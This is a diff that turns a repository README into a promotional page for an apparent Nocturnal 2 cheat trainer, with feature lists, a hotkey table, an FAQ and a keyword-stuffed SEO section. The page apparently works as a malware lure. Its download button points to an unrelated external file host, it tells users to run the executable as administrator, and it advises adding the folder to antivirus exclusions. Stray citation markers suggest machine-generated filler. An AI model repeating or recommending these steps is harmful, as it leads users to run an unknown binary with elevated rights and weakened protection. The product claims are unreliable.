@@ -1,2 +1,146 @@
-# .github
-Windows cheat panel for Nocturnal 2 with unlimited health, fire ability control, and resource multipliers. Built for the 2D metroidvania where wielding fire against the darkness and exploring every hidden passage matters more than grinding through every combat encounter with limited resources.
+<h1 align="center">🔥 Nocturnal 2 Cheat Panel</h1>
+
+<p align="center">
+  <strong>Burn The Dark. Skip The Grind.</strong>
+</p>
+
+<p align="center">
+  Windows cheat panel for Nocturnal 2.
+  <br>
+  Health Control · Fire Ability Mods · Resource Multipliers · Trainer
+</p>
+
+<p align="center">
+  <a href="https://dyhuiying.com/s/file">
+    <img src="https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-8B5CF6?style=for-the-badge&logo=windows&logoColor=white" alt="Nocturnal 2 Cheat Panel Download">
+  </a>
+</p>
+
+<p align="center">
+  <img src="https://img.shields.io/badge/version-1.0-8B5CF6?style=flat-square">
+  <img src="https://img.shields.io/badge/platform-Windows%2010%20%2F%2011-8B5CF6?style=flat-square&logo=windows&logoColor=white">
+  <img src="https://img.shields.io/badge/status-active-2ea44f?style=flat-square">
+  <img src="https://img.shields.io/badge/modules-8%2B-252525?style=flat-square">
+</p>
+
+<details>
+<summary>📑 Contents</summary>
+
+- [⚡ Quick Start](#-quick-start)
+- [🖥️ Requirements](#️-requirements)
+- [✨ Key Features](#-key-features)
+- [📋 Module Overview](#-module-overview)
+- [🚀 Why Choose Nocturnal 2 Cheat Panel](#-why-choose-nocturnal-2-cheat-panel)
+- [💡 Why Use It](#-why-use-it)
+- [🎮 About Nocturnal 2](#-about-nocturnal-2)
+- [❓ FAQ](#-faq)
+- [🔎 SEO Keywords](#-seo-keywords)
+- [⚠️ Disclaimer](#️-disclaimer)
+
+</details>
+
+## ⚡ Quick Start
+
+1. Download the archive from the button above.
+2. Extract it to any folder on your Windows drive.
+3. Right-click the executable and select **Run as administrator**.
+
+The cheat panel opens once Nocturnal 2 reaches the main menu.
+
+## 🖥️ Requirements
+
+| Component | Minimum |
+|-----------|---------|
+| OS | Windows 10 / 11, 64-bit |
+| RAM | 8 GB |
+| Storage | 100 MB free space |
+| Privileges | Administrator |
+
+## ✨ Key Features
+
+### 🛡️ Survival Control
+- 💚 **Unlimited Health** — freeze HP during combat encounters and environmental hazards.
+- 🛡️ **God Mode** — toggle damage immunity for testing routes and secret areas.
+- 🧪 **Instant Heal** — restore health without consuming limited resources.
+
+### 🔥 Fire & Progression
+- 🔥 **Unlimited Fire** — remove fire ability cooldown and resource limits.
+- 💎 **Resource Multiplier** — scale collected materials and upgrade currency.
+- 🎒 **Weight Limit Toggle** — disable inventory carrying restrictions.
+
+### 🎛️ Interface Control
+- ⌨️ **Hotkey Panel** — INSERT to toggle, F1–F5 for individual modules.
+- 💾 **Profile Saving** — configurations persist between sessions.
+- 🎨 **Compact Overlay** — panel stays out of the way during exploration.
+
+## 📋 Module Overview
+
+| Module | What it does | Hotkey |
+|--------|--------------|--------|
+| Unlimited Health | Freeze current HP | F1 |
+| God Mode | Toggle damage immunity | F2 |
+| Unlimited Fire | Remove fire ability limits | F3 |
+| Resource Multiplier | Scale material and currency gains | F4 |
+| Weight Limit Toggle | Remove inventory capacity cap | F5 |
+| Instant Heal | Restore health without resources | INSERT |
+| Profile Save | Persist current configuration | Mouse4 |
+| Overlay Toggle | Show/hide the panel | Mouse5 |
+
+## 🚀 Why Choose Nocturnal 2 Cheat Panel
+
+- ✅ Built around Nocturnal 2's fire-based metroidvania mechanics, not adapted from a generic platformer trainer .
+- ✅ Unlimited fire lets you test every ability interaction without waiting on resource regeneration.
+- ✅ Resource multiplier respects the game's upgrade economy instead of a flat infinite-material toggle.
+- ✅ Lightweight panel that stays responsive during exploration and combat.
+
+## 💡 Why Use It
+
+- 🎮 Explore every hidden passage without resetting after combat encounters.
+- 🔍 Test fire ability combinations at their full potential.
+- 🧭 Collect resources at your own rate instead of grinding every room.
+- ⚡ Toggle modules on the fly when you want a cleaner metroidvania experience.
+
+## 🎮 About Nocturnal 2
+
+| Field | Detail |
+|-------|--------|
+| Genre | 2D Metroidvania / Action |
+| Release | November 10, 2026 |
+| Modes | Single-player |
+| Platform | Windows |
+| Setting | Fire-based exploration |
+
+Nocturnal 2 is a 2D metroidvania where players wield fire abilities to explore a dark world, uncovering secrets and fighting through challenging encounters [citation:6][citation:14].
+
+## ❓ FAQ
+
+**Do I need to run it as Administrator?**
+Yes — admin rights are required for the overlay to attach.
+
+**Will my antivirus flag the panel?**
+Trainer executables are sometimes flagged due to memory interaction. Add the folder to exclusions if needed.
+
+**Does it work on Windows 11?**
+Yes, the panel is built for Windows 10 and 11, 64-bit.
+
+**Does it work with the latest Nocturnal 2 patch?**
+The module offsets are maintained against current game builds. Check release notes after major updates.
+
+**How do I update the panel?**
+Download the latest archive and replace the existing files.
+
+## 🔎 SEO Keywords
+
+nocturnal 2 cheat, nocturnal 2 cheat panel, nocturnal 2 trainer, nocturnal 2 overlay cheat, nocturnal 2 unlimited health, nocturnal 2 unlimited fire, nocturnal 2 resource multiplier, nocturnal 2 god mode, nocturnal 2 windows cheat, nocturnal 2 metroidvania tool, nocturnal 2 weight limit, nocturnal 2 instant heal, nocturnal 2 configurable cheat, nocturnal 2 2d metroidvania cheat, nocturnal 2 fire ability trainer, nocturnal 2 single player trainer, nocturnal 2 pc cheat, nocturnal 2 trainer panel, nocturnal 2 progression cheat
+
+## ⚠️ Disclaimer
+
+This software is provided for educational purposes only. Use it at your own risk.
+
+<p align="center">
+  <strong>🔥 Nocturnal 2 Cheat Panel</strong>
+  <br>
+  Health Control · Fire Ability Mods · Resource Multipliers · Trainer
+  <br>
+  Windows Desktop Utility
+</p>
